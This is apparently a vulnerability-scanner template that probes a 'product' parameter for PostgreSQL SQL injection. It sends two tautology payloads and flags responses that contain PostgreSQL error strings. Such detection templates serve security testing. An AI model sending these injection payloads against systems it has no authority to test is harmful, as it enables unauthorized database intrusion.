id: sqli6-pg-28
name: 'SQLi pg probe in product'
severity: high
type: active
tags:
  - sqli
  - injection
  - pg
description: 'Triggers pg error via product'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      product:
        - '1''||''1''=''1'
        - '" OR "1"="1'
    matchers:
      - type: regex
        part: body
        regex:
          - 'PostgreSQL'
          - 'pg_query'
